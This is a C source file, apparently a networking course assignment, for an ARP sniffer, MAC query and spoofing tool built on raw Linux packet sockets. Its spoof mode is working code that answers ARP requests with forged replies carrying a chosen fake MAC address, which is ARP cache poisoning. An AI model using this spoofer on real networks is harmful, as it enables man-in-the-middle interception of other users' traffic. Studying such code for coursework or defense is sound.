#include <netinet/if_ether.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <netinet/in.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <linux/if.h>
#include "arp.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>
#include <unistd.h>
#include <getopt.h>

// struct in_addr
// {
//     unsigned long s_addr;            // 4 bytes load with inet_pton()
// };

/* 
 * Change "enp2s0f5" to your device name (e.g. "eth0"), when you test your hoework.
 * If you don't know your device name, you can use "ifconfig" command on Linux.
 * You have to use "enp2s0f5" when you ready to upload your homework.
 */
#define DEVICE_NAME "enp4s0"

/*
 * You have to open two socket to handle this program.
 * One for input , the other for output.
 */

void print_help(){
    printf("1) ./arp -l -a\n");
    printf("2) ./arp -l <filter_ip_address>\n");
    printf("3) ./arp -q <query_ip_address>\n");
    printf("4) ./arp <fake_mac_address> <target_ip_address>\n");
}

struct arp_packet recv_arp_packet(int opcode, int mode, int sockfd_recv, struct in_addr filter_ip){
    struct arp_packet arp_pack_recv;
    struct sockaddr_ll sa;

    socklen_t salen = sizeof(struct sockaddr_ll);

    while(recvfrom(sockfd_recv, &arp_pack_recv, sizeof(struct arp_packet), 0, (struct sockaddr*)&sa, &salen)){
        if (arp_pack_recv.eth_hdr.ether_type != htons(ETHERTYPE_ARP))
            continue;

        if (arp_pack_recv.arp.arp_pro != htons(ETHERTYPE_IP))
            continue;

        if (ntohs(arp_pack_recv.arp.arp_op) != opcode)
            continue;

        if (mode == 1 && (*(unsigned int*)arp_pack_recv.arp.arp_tpa != filter_ip.s_addr)) continue;
        if (mode == 2 && (*(unsigned int*)arp_pack_recv.arp.arp_spa != filter_ip.s_addr)) continue;

        return arp_pack_recv;
    }
}

int send_arp_packet(int opcode, int sockfd_send, u_char* source_mac, u_char* target_mac, int sll_ifindex, struct in_addr source_ip, struct in_addr target_ip){
    struct sockaddr_ll sa;
    struct arp_packet arp_pack_send;

    bzero(&sa, sizeof(sa));
    
    // Build a ARP packet
    memcpy(arp_pack_send.eth_hdr.ether_dhost, target_mac, ETHER_ADDR_LEN);
    memcpy(arp_pack_send.eth_hdr.ether_shost, source_mac, ETHER_ADDR_LEN);
    arp_pack_send.eth_hdr.ether_type = htons(ETHERTYPE_ARP);

    arp_pack_send.arp.arp_hrd = htons(ARPHRD_ETHER);
    arp_pack_send.arp.arp_pro = htons(ETHERTYPE_IP);
    arp_pack_send.arp.arp_hln = ETHER_ADDR_LEN;
    arp_pack_send.arp.arp_pln = 4;
    arp_pack_send.arp.arp_op = htons(opcode);
    memcpy(arp_pack_send.arp.arp_sha, source_mac, ETHER_ADDR_LEN);
    memcpy(arp_pack_send.arp.arp_tha, target_mac, ETHER_ADDR_LEN);
    memcpy(arp_pack_send.arp.arp_spa, &source_ip.s_addr, 4);
    memcpy(arp_pack_send.arp.arp_tpa, &target_ip.s_addr, 4);

    sa.sll_family = PF_PACKET;
    sa.sll_halen = htons(ETHER_ADDR_LEN);
    sa.sll_ifindex = sll_ifindex;

    if (sendto(sockfd_send, &arp_pack_send, sizeof(arp_pack_send), 0, (struct sockaddr*)&sa, sizeof(sa)) == -1){
        perror("sendto error.");
        return -1;
    }
    
    return 0;
}

int main(int argc, char **argv){
    if(geteuid() != 0){
        printf("ERROR: You must be root to use this tool!\n");
        exit(1);
    }

    if(argc == 1){
        printf("Usage :\n");
        print_help();
        exit(1);
    }

    int sockfd_recv = 0, sockfd_send = 0;
	struct sockaddr_ll sa;
	struct ifreq req;
	struct in_addr myip;
    u_char FAKER_MAC[6];

    int mode = 0;
    int recv_mode = 0;

    // Open a recv socket in data-link layer.
    if ((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
        perror("open recv socket error");
        exit(1);
	}

    printf("[ ARP sniffer and spoof program ]\n");

    const char *optstring = "hl:q:";
    static struct option opts[] = {
        {"help", 0, NULL, 'h'},
        {"list", 1, NULL, 'l'},
        {"query", 1, NULL, 'q'}
    };

    const char* const delim = ":";
    int count = 0;
    char* substr = NULL;

    int c;
    c = getopt_long_only(argc, argv, optstring, opts, NULL);
    switch(c) {
        case 'h':
            printf("Format :\n");
            print_help();
            break;
        case 'l':
            mode = 1;
            recv_mode = 0;
            if(strcmp(optarg, "-a") != 0)
                recv_mode = 1, myip.s_addr = inet_addr(optarg);
            break;
        case 'q':
            mode = 2;
            myip.s_addr = inet_addr(optarg);
            break;
        case '?':
            printf("Usage :\n");
            print_help();
            exit(1);
            break;
        default:
            mode = 3;
            substr = strtok(argv[1], delim);
            do {
                FAKER_MAC[count] = strtol(substr, NULL, 16);
                substr = strtok(NULL, delim);
                count++;
            } while (substr);

            myip.s_addr = inet_addr(argv[2]);
    };

    if(mode == 1){
        printf("### ARP sniffer mode ###\n");

        /* arp frame points to the arp data inside the ethernet frame */
        struct arp_packet arp_pack_recv;

        /* read until we got an arp packet or socket got a problem */
        while(1){
            arp_pack_recv = recv_arp_packet(ARPOP_REQUEST, recv_mode, sockfd_recv, myip);

            printf("Get ARP packet - Who has %u.%u.%u.%u ?   \t\t\t   Tell %u.%u.%u.%u\n",
                arp_pack_recv.arp.arp_tpa[0], arp_pack_recv.arp.arp_tpa[1], arp_pack_recv.arp.arp_tpa[2], arp_pack_recv.arp.arp_tpa[3],
                arp_pack_recv.arp.arp_spa[0], arp_pack_recv.arp.arp_spa[1], arp_pack_recv.arp.arp_spa[2], arp_pack_recv.arp.arp_spa[3]
            );
        }
        exit(0);
    }

	
	// Open a send socket in data-link layer.
	if((sockfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		perror("open send socket error");
		exit(sockfd_send);
	}
	
	/*
	 * Use ioctl function binds the send socket and the Network Interface Card.
`	 * ioctl( ... )
	 */

    struct sockaddr_in *addr;
    struct in_addr source_ip;
    int sll_ifindex;
    u_char SOURCE_MAC[6];
    u_char TARGET_MAC[] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

    strcpy(req.ifr_ifrn.ifrn_name, DEVICE_NAME);	//set Device name

    if(ioctl(sockfd_send, SIOCGIFADDR, &req) == -1)
        perror("ioctl error."), exit(1);

    addr = (struct sockaddr_in*)&(req.ifr_addr);
    source_ip = addr->sin_addr;

    if(ioctl(sockfd_send, SIOCGIFINDEX, &req) == -1)
        perror("ioctl error."), exit(1);

    sll_ifindex = req.ifr_ifru.ifru_ivalue;

    if(ioctl(sockfd_send, SIOCGIFHWADDR, &req) == -1)
        perror("hwaddr error."), exit(1);

    memcpy(SOURCE_MAC, req.ifr_hwaddr.sa_data, ETHER_ADDR_LEN);
	
	// Fill the parameters of the sa.

	
	/*
	 * use sendto function with sa variable to send your packet out
	 * sendto( ... )
	 */

    if(mode == 2){
        printf("### ARP query mode ###\n");

        struct arp_packet arp_pack_recv;

        if(send_arp_packet(ARPOP_REQUEST, sockfd_send, SOURCE_MAC, TARGET_MAC, sll_ifindex, source_ip, myip))
            exit(1);

        arp_pack_recv = recv_arp_packet(ARPOP_REPLY, 2, sockfd_recv, myip);

        printf("MAC Address of %u.%u.%u.%u is %x:%x:%x:%x:%x:%x\n",
            arp_pack_recv.arp.arp_spa[0], arp_pack_recv.arp.arp_spa[1], arp_pack_recv.arp.arp_spa[2], arp_pack_recv.arp.arp_spa[3],
            arp_pack_recv.arp.arp_sha[0], arp_pack_recv.arp.arp_sha[1], arp_pack_recv.arp.arp_sha[2],
            arp_pack_recv.arp.arp_sha[3], arp_pack_recv.arp.arp_sha[4], arp_pack_recv.arp.arp_sha[5]
        );
    }

    if (mode == 3) {
        printf("### ARP spoof mode ###\n");

        struct arp_packet arp_pack_recv;

        arp_pack_recv = recv_arp_packet(ARPOP_REQUEST, 1, sockfd_recv, myip);

        printf("Get ARP packet - Who has %u.%u.%u.%u ?   \t\t   Tell %u.%u.%u.%u\n",
            arp_pack_recv.arp.arp_tpa[0], arp_pack_recv.arp.arp_tpa[1], arp_pack_recv.arp.arp_tpa[2], arp_pack_recv.arp.arp_tpa[3],
            arp_pack_recv.arp.arp_spa[0], arp_pack_recv.arp.arp_spa[1], arp_pack_recv.arp.arp_spa[2], arp_pack_recv.arp.arp_spa[3]);

        send_arp_packet(ARPOP_REPLY, sockfd_send, FAKER_MAC, arp_pack_recv.arp.arp_sha, sll_ifindex, myip, *(struct in_addr*)arp_pack_recv.arp.arp_tpa);
        printf("Sent ARP REPLY : %s is %x:%x:%x:%x:%x:%x\n", 
            inet_ntoa(myip),
            FAKER_MAC[0], FAKER_MAC[1], FAKER_MAC[2], FAKER_MAC[3], FAKER_MAC[4], FAKER_MAC[5]);
    }

    return 0;
}
